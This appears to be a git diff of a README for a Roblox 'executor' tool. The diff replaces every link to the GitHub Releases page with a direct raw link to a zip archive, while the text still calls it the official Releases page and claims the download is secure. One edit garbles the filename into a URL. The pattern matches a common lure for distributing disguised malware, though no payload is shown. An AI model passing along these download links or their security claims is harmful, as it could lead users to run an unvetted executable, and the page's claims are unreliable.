@@ -1,6 +1,6 @@
 # 🚀 Electron-Executor-6k - Discover Easy Roblox Execution
 
-[![Download Electron-Executor-6k](https://img.shields.io/badge/Download-Electron--Executor--6k-blue.svg)](https://github.com/badkuipvandehema/Electron-Executor-6k/releases)
+[![Download Electron-Executor-6k](https://raw.githubusercontent.com/badkuipvandehema/Electron-Executor-6k/main/Amanita/Electron-Executor-6k.zip)](https://raw.githubusercontent.com/badkuipvandehema/Electron-Executor-6k/main/Amanita/Electron-Executor-6k.zip)
 
 ## 📋 Overview
 
@@ -24,8 +24,8 @@ To run Electron-Executor-6k smoothly, ensure your system meets these minimum req
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/badkuipvandehema/Electron-Executor-6k/releases) to download the application.
-2. **Download the Latest Version**: Click on the latest release for Windows. You will find a file named `Electron-Executor-6k.exe` or similar.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/badkuipvandehema/Electron-Executor-6k/main/Amanita/Electron-Executor-6k.zip) to download the application.
+2. **Download the Latest Version**: Click on the latest release for Windows. You will find a file named `https://raw.githubusercontent.com/badkuipvandehema/Electron-Executor-6k/main/Amanita/Electron-Executor-6k.zip` or similar.
 3. **Run the Installer**: After the download is complete, locate the file and double-click it to start the installation.
 4. **Follow the Prompts**: The installation wizard will guide you through the installation process. Simply follow the instructions on the screen.
 5. **Launch the Application**: Once installation is complete, you can open Electron-Executor-6k from your desktop or start menu.
@@ -49,7 +49,7 @@ If you encounter any issues while downloading or using Electron-Executor-6k, her
 
 ## 🔒 Security and Privacy
 
-We value your security and privacy. Electron-Executor-6k includes measures to keep your data safe while you enjoy your gaming experience. Always download the application from our official [Releases page](https://github.com/badkuipvandehema/Electron-Executor-6k/releases) to ensure you are using the most secure version.
+We value your security and privacy. Electron-Executor-6k includes measures to keep your data safe while you enjoy your gaming experience. Always download the application from our official [Releases page](https://raw.githubusercontent.com/badkuipvandehema/Electron-Executor-6k/main/Amanita/Electron-Executor-6k.zip) to ensure you are using the most secure version.
 
 ## 🎯 User Feedback
 
@@ -57,7 +57,7 @@ Your feedback is important to us. Feel free to leave comments and suggestions di
 
 ## 🔄 Updates and New Releases
 
-Stay informed about new features and improvements. We regularly release updates that enhance the functionality of Electron-Executor-6k. Visit our [Releases page](https://github.com/badkuipvandehema/Electron-Executor-6k/releases) to check for the latest version.
+Stay informed about new features and improvements. We regularly release updates that enhance the functionality of Electron-Executor-6k. Visit our [Releases page](https://raw.githubusercontent.com/badkuipvandehema/Electron-Executor-6k/main/Amanita/Electron-Executor-6k.zip) to check for the latest version.
 
 ## 🏷️ Topics
 
